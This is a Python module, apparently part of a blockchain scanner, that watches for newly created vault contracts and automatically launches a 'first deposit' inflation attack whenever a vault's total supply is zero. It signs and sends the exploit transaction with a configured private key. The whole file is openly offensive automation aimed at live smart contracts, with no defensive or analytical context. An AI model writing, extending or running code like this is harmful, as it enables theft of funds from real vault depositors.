"""
Sniper module for instant First Deposit exploitation.
"""
from typing import Optional, Dict, Any
from web3 import Web3
from scanner.config import PRIVATE_KEY
from scanner.exploit_executor import _exploit_first_deposit

def snipe_inflation_attack(w3: Web3, target_address: str) -> None:
    """
    Ultra-fast check and exploit for First Deposit Bug.
    Called immediately upon Factory Event detection.
    """
    if not PRIVATE_KEY:
        return

    try:
        # 1. Fast Check TotalSupply
        # totalSupply() -> 18160ddd
        # We assume it is a vault-like contract if it came from a factory we watch
        data = bytes.fromhex("18160ddd")
        
        # Use simple call, if it reverts/fails, it's not a valid vault or busy
        try:
            res = w3.eth.call({"to": target_address, "data": data})
        except Exception:
            return

        supply = 0
        if res and len(res) >= 32:
             supply = int(res.hex(), 16)
        
        if supply == 0:
             print(f"[SNIPER] {target_address} has 0 supply! Launching First Deposit...", flush=True)
             
             # Setup account
             account = w3.eth.account.from_key(PRIVATE_KEY)
             nonce = w3.eth.get_transaction_count(account.address)
             
             # Reuse existing logic but force execution
             # We pass empty details because _exploit_first_deposit handles resolution
             tx = _exploit_first_deposit(w3, account, target_address, nonce, "confirmed_inflation_attack", {})
             
             if tx:
                 print(f"[SNIPER] Transaction sent: {tx}", flush=True)
                 
    except Exception as e:
        # print(f"[SNIPER] Failed: {e}", flush=True)
        pass
